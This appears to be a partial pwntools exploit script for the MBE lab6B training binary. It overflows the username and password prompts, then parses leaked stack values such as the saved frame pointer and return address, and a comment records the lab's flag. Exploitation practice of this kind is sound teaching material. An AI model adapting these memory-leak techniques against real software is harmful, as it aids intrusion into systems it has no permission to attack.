#!/usr/bin/env python2
# Based on https://github.com/Corb3nik/MBE-Solutions/blob/master/lab6b/solution.py
from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337
# Flag : strncpy_1s_n0t_s0_s4f3_l0l

settings = {

    # Path to binary
    "binary"        : "./lab6B",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    payload = "B" * 0x30 # 48 As, just in case
    p.sendlineafter("Enter your username: ", payload)

    payload = xor("\xff" * 0x32)  #, "\x99")
	
    p.sendlineafter("Enter your password: ", payload)

    p.recvuntil("Authentication failed for user ")

    # Analyze leaks
    leak = p.recvline()
    username = leak[:0x20]
    hashed_password = leak[0x20:0x40]
    result_val = u32(leak[0x40:0x44])
    attempts = u32(leak[0x44:0x48])
    garbage = u64(leak[0x48:0x50])
    old_ebp = u32(leak[0x50:0x54])
    ret = u32(leak[0x54:0x58])

    p.clean()

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])
		
    #p = remote('127.0.0.1', int(6642))
    p = process(binary.path)
    print("The pid is: "+str(pidof(p)))
    pause()
    exploit()
